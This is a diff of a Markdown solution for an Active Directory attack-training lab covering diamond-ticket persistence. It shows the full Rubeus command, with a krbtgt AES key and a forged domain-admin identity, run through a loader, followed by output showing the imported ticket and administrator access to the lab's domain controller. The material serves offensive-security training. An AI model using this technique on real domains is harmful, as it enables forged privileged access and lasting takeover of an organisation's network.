@@ -1,31 +1,21 @@
-# Learning Objective 10
+# Learning Objective 10 (Persistence | Diamond Ticket)
 
 ## Tasks
 
-1. **Use domain admin privileges obtained earlier to execute the diamond ticket attack**
+1. **Use domain admin privileges obtained earlier (see *Learning Objective 08*) to execute the diamond ticket attack**
 
 ---
 
 ## Solution
 
-1. **Use domain admin privileges obtained earlier to execute the diamond ticket attack**
+1. **Use domain admin privileges obtained earlier (see *Learning Objective 08*) to execute the diamond ticket attack**
 
 We can simply use the following Rubeus command to execute the attack.
-Note that the command needs to be run from an elevated shell ('run as administrator'). We take the usual OPSEC care of using Loader.
+Note that the command needs to be run **from an elevated shell ('run as administrator')**. We take the usual OPSEC care of using Loader.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /groups`:
 ```
@@ -37,7 +27,7 @@ Group Name                                 Type             SID                 
 ========================================== ================ ============================================= ===============================================================
 Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
 BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
+BUILTIN\Administrators👥                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
 BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
@@ -48,6 +38,8 @@ dcorp\RDPUsers                             Group            S-1-5-21-719815819-3
 Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
+
+In order to perform the diamond ticket attack we need to use the `krbtgt` aes256 key.
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -86,24 +78,14 @@ Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 [SNIP]
 
 [*] Target LUID: 0x626d5a
-[+] Ticket successfully imported!
+[+] Ticket successfully imported!🎟️
 ```
 
 Access the DC using winrs from the new spawned process!
 
 ![New spawned terminal process](./assets/screenshots/learning_objective_10_new_spawned_terminal_process.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /groups`:
 ```
@@ -117,7 +99,7 @@ Current LogonId is 0:0x626d5a
 
 Cached Tickets: (1)
 
-#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
@@ -138,7 +120,7 @@ C:\Users\Administrator>
 ```
 🚀
 
-![Victim: dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+![dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
